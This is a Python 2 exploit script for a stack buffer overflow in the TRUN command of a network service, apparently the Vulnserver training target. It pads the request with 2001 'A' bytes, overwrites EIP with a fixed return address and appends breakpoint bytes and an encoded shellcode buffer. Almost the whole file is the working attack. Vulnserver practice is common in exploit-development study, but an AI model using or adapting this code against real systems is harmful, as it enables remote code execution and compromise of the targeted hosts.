#!/usr/bin/python
import socket
import sys
import os

buf =  ""
buf += "\xbd\x1f\x9e\x54\xcc\xda\xd1\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x61\x83\xc2\x04\x31\x6a\x11\x03\x6a\x11\xe2"
buf += "\xea\x20\xb7\xae\xdb\xf0\xe3\xf5\x3a\x7e\x30\xfe\xe6"
buf += "\x4e\xf1\x4f\x4d\x32\xeb\x4c\x40\x46\xe2\xaf\x33\xca"
buf += "\xd7\xf7\xbd\xbd\x40\xdf\xd5\x64\xa0\x6f\x6b\x5a\x22"
buf += "\x10\x9c\xd5\xfe\x64\xfc\xcf\x7a\x0d\xfe\x0e\xb2\x43"
buf += "\xac\x18\x0f\xc5\xbe\xac\xda\x3d\x44\x55\xd6\x3e\x9f"
buf += "\x43\x58\xce\x6d\x39\x86\xe5\x34\x41\xa2\x42\x49\x98"
buf += "\x9b\xfe\xd1\xea\x0e\xf4\x1f\x07\x54\xb9\x37\x85\xd6"
buf += "\xc3\x0c\x9d\x73\x7f\xb9\x7c\x25\x55\x47\xd6\xc5\xe2"
buf += "\x7d\x92\x91\xd7\xb7\x26\x01\xf3\x5d\x13\x72\x07\xe4"
buf += "\xe3\xe2\xaa\x3b\x7b\x38\x4e\x07\xc1\xa0\x46\x58\x23"
buf += "\xc0\x86\x19\xef\x36\x02\xd7\x64\x53\x94\xb2\xfb\xb5"
buf += "\xd7\x03\xda\x45\x1e\x35\x3c\x93\xde\x28\x62\x44\xff"
buf += "\xcb\x11\x16\x34\x04\x6a\xd1\x48\xa7\x29\x54\x20\x18"
buf += "\x35\x02\x0a\x6e\x20\x59\xdc\xf4\xf7\xf6\x3c\x02\xb8"
buf += "\x9e\x25\xcb\xc2\x55\xb3\x0f\xa8\x0d\xc4\x8c\xbb\x3e"
buf += "\x4a\xdc\xb5\xb7\xd2\x67\x11\xd3\x0c\x5b\xdd\x8a\xad"
buf += "\x3d\xbc\x7a\x57\x7c\x47\xb6\x5f\xd8\x41\x51\x92\xc2"
buf += "\xa3\xf4\x16\x13\x63\x3c\x7a\xa1\xaa\x40\x0a\x5c\x07"
buf += "\xf2\x37\xa7\xde\x8c\x90\x84\x92\x1a\xaf\x43\xd1\xeb"
buf += "\xdc\x5c\x1e\x95\x53\xbf\x37\x6e\x91\xa6\x1b\x7c\x6e"
buf += "\x95\x4b\x50\xb9\xcd\x45\x18\x31\x7a\xf5\x83\x93\xb8"
buf += "\xb6\x84\x6e\xb9\xbd\x5b\xec\x7f\xc3\xdc\xa0\xf8\x6b"
buf += "\x55\x81\xcc\x5a\x2c\x24\x5a\x56\x59\x53\xe8\x5f\x2e"
buf += "\x96\x48\xad\x67\x37\x8e\xc4\x95\xe8\x10\x8b\x7c\x6b"
buf += "\xc6\x19\x75\x12\x1f\xb2\xec\x3c\xfb\x52\x47\x81\x2f"
buf += "\x38\x0a\xb8\xd3\xec\x42\xab\xf8\x32\x07\x9c\xd8\x72"
buf += "\xd4\xb2\x0d\xdf\x9a\x67\x95\xe5\x9f\x7e\x41\xbd\xc8"
buf += "\x52\x04\xaf\x0d\xd9\x40\x4a\x2e\xaf\x12\x70\x9d\x43"
buf += "\x40\x18\xec\x99\xdd\x48\x92\xf6\x90\xbf\x1c\x43\xc6"
buf += "\x85\xbb\x58\x20\x76\xaa\x06\xa8\x44\xba\xfe"



if len(sys.argv)!=3:
    print "argumnets missing e.g-> python exploit.py  LHOST  LPORT "
    exit(0)



#print sys.argv



server = sys.argv[1]
sport = int(sys.argv[2])


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

cmd='TRUN .' 

eip = '\xaf\x11\x50\x62'

interrupt = '\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC'
ebp='1111'
padding='A'*2001
print "Sending attack to ", cmd, " A * "
attack = padding+ebp+eip+interrupt+buf
s.send((cmd + ' ' + attack ))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
